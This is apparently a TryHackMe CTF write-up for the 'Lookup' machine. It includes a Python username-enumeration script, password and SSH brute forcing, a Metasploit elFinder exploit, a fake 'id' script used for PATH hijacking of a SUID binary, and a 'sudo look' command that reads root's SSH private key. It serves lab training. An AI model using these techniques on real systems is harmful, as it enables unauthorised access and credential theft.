#Red-Team #Writeup #CTF #Vulnerability #TryHackMe 

## Reconnaissance/Enumeration


### Initial Scan

#### We begin with an `nmap` scan and find two open ports:

	Port 22: SSH
	Port 80: HTTP (Apache/2.4.41 on Ubuntu)

![[Pasted image 20241123124801.png]]

### Exploring HTTP
#### Visiting port 80 redirects us to `http://lookup.thm`.
#### To access this site, we add `lookup.thm` to the `/etc/hosts` file:

![[Pasted image 20241123124825.png]]

#### `echo 'MACHINE_IP lookup.thm' >> /etc/hosts`

#### Now, navigating to the URL presents us with a login page.

![[Pasted image 20241123125020.png]]

#### Entering `admin` as both username and password results in a "wrong password" error and redirects back after three seconds.

![[Pasted image 20241123125123.png]]

#### Using a different username gives a "wrong username or password" error.

![[Pasted image 20241123125229.png]]


## Initial exploitation/Gaining access


 ### Enumerating Valid Usernames

#### These observations suggest we can enumerate valid usernames. A simple Python script helps automate this:

````                                                                                                                       
#!/usr/bin/python3

import requests

url = "http://lookup.thm/login.php"
file_path = "/usr/share/seclists/Usernames/Names/names.txt"

try:
    with open(file_path, "r") as file:
        for username in file:
            username = username.strip()
            if not username:
                continue
            
            response = requests.post(url, data={"username": username, "password": "password"})
            
            if "Wrong password" in response.text:
                print(f"Valid username: {username}")
                break  # Stop if a valid username is found
                
except FileNotFoundError:
    print("Usernames file not found.")
except Exception as e:
    print(f"An error occurred: {e}")
````

#### After running the script, we find two valid usernames.

![[Pasted image 20241123131026.png]]

### Brute Forcing Passwords

#### Since we already knew `admin` was valid, we attempt to brute force the password for the second user, `jose`. Tools like Burp Suite's **Turbo Intruder** or **Hydra** can assist here.

![[Pasted image 20241123131314.png]]

![[Pasted image 20241123131642.png]]

#### After finding the password, we log in successfully.

![[Pasted image 20241123131724.png]]

### Subdomain Discovery

#### After logging in, we are redirected to a subdomain. Adding this to `/etc/hosts` lets us proceed:

### `echo 'MACHINE_IP lookup.thm files.lookup.thm' >> /etc/hosts`


![[Pasted image 20241123132030.png]]

#### This subdomain hosts a file manager running **elFinder CMS**. Checking the `?` button reveals the version.

![[Pasted image 20241123132217.png]]

### Research and Exploitation

#### Researching this version reveals a Metasploit exploit for **elFinder**.

![[Pasted image 20241123132350.png]]
#### After configuring and running the exploit, we gain a shell.

![[Pasted image 20241123150643.png]]
#### After the configuration, we run the exploit and get the shell

![[Pasted image 20241123132757.png]]


## Privilege escalation to user


### SUID Binary Discovery

#### Listing SUID binaries shows a binary named `pwm`, owned by root.

![[Pasted image 20241123134631.png]]

#### When executed, the binary runs the `id` command, attempts to read the `.passwords` file, and outputs its content if found. However, it fails if the `.passwords` file is missing.

![[Pasted image 20241123134729.png]]

### Exploiting `pwm`

#### Checking home directories reveals a user named `think` with a `.passwords` file.

![[Pasted image 20241123144155.png]]
#### To trick the binary, we create a fake `id` command in `/tmp` and modify the `PATH` environment variable.

#### We create `/tmp/id` with this content (and make it executable):

````
#!/bin/sh
echo "uid=33(think) gid=33(think) groups=33(think)"
````

![[Pasted image 20241123135922.png]]
#### unning `pwm` now prints the `.passwords` file.

![[Pasted image 20241123142312.png]]

### SSH Brute Force

#### Saving the passwords locally, we brute force the SSH login for `think`.

![[Pasted image 20241123143411.png]]

#### After logging in, we retrieve the user flag.


## Privilege escalation to root


### Identifying Sudo Privileges

#### Running `sudo -l` shows that we can execute the `look` command as root.

![[Pasted image 20241123144420.png]]

#### Researching `look` on **GTFOBins** reveals it can be used for privileged reads.

![[Pasted image 20241123144544.png]]

### Exploiting `look`

#### Using `look`, we read `/root/.ssh/id_rsa`:

#### `sudo -u root /usr/bin/look '' "/root/.ssh/id_rsa"`

![[Pasted image 20241123144753.png]]

#### Using the extracted SSH private key, we log in as root and retrieve the final flag.

![[Pasted image 20241123145236.png]]

